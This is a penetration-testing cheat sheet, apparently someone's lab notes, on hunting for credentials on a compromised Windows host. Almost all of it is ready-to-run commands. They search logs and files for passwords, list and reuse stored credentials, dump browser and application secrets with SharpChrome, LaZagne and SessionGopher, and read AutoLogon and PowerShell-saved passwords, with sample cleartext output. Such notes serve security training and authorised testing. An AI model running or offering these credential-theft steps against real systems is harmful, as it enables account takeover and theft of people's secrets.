# Credential Theft

Credential hunting involves searching for sensitive information, such as usernames and passwords, within various files and system locations. Below are methods for locating credentials on Windows systems.

### **Searching Security Logs Using wevtutil**

You can query security logs for specific user actions, such as logins or credential usage:

```powershell
PS C:\dbs> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

#### Example Output:

```perl
Process Command Line:   net use T: \\dbs\users /user:dollar P@ssword
```

### **Searching for Credentials in Files**

#### Using Command Prompt

*   Search for specific terms like "password" in various file types:

    ```cmd
    C:\dbs> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
    ```

    * **Flags**:
      * `/S`: Search in the current directory and all subdirectories.
      * `/I`: Ignore case sensitivity.
      * `/M`: Output only filenames containing the search string.
*   Searching within a specific user directory:

    ```cmd
    C:\dbs> findstr /S /I /C:"password" "C:\Users\*"*.txt *.ini *.cfg *.config *.xml
    ```
*   Manually searching a user's Documents folder:

    ```cmd
    C:\dbs> cd C:\Users\dollarboysushil\Documents & findstr /SI /M "password" *.xml *.ini *.txt
    ```

#### Using PowerShell

*   To search through text files in the Documents folder:

    ```powershell
    PS C:\dbs> select-string -Path C:\Users\dollarboysushil\Documents\*.txt -Pattern password
    ```
*   To find files with "pass" in their names:

    ```powershell
    C:\dbs> dir /S /B *pass*.txt, *pass*.xml, *pass*.ini, *cred*, *vnc*, *.config*
    ```
*   Searching recursively for configuration files:

    ```powershell
    C:\dbs> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
    ```

### **Further Credential Theft**

#### Listing Stored Credentials

*   To list stored usernames and passwords:

    ```cmd
    C:\dbs> cmdkey /list
    ```
*   To run a command as another user and save credentials:

    ```powershell
    C:\dbs> runas /savecred /user:marvel\james "COMMAND HERE"
    ```

#### Retrieving Browser Credentials

*   Use SharpChrome to retrieve cookies and saved logins from Google Chrome:

    ```powershell
    PS C:\dbs> .\SharpChrome.exe logins /unprotect
    ```
*   Using Lazagne to retrieve credentials from various applications:

    ```powershell
    PS C:\dbs> .\lazagne.exe all
    ```
*   Extracting saved credentials from various applications using SessionGopher:

    ```powershell
    C:\dbs> Import-Module .\SessionGopher.ps1
    C:\dbs> Invoke-SessionGopher -Target WIN01
    ```

### **Windows AutoLogon**

Windows AutoLogon allows a user to configure their system to automatically log into a specific account without entering credentials each time. The relevant registry keys can be found under `HKEY_LOCAL_MACHINE`:

```cmd
C:\dbs> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Example Output:

```css
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    dollarboysushil
DefaultPassword   REG_SZ    pleasesubscribe
```

### **Clear-Text Password Storage in the Registry**

#### PuTTY

* Saved sessions for PuTTY can be found in the following registry location:

```php-template
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

#### Viewing Saved Wireless Networks

*   To view saved wireless network profiles:

    ```cmd
    netsh wlan show profile
    ```

### **PowerShell Credentials**

PowerShell credentials can be stored and retrieved securely for scripting purposes. They are encrypted using Data Protection API (DPAPI) and can be decrypted only by the same user on the same computer.

#### Example Commands:

```powershell
C:\dbs> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
C:\dbs> $credential.GetNetworkCredential().username
dollar
C:\dbs> $credential.GetNetworkCredential().password
pleasesubscribe
```
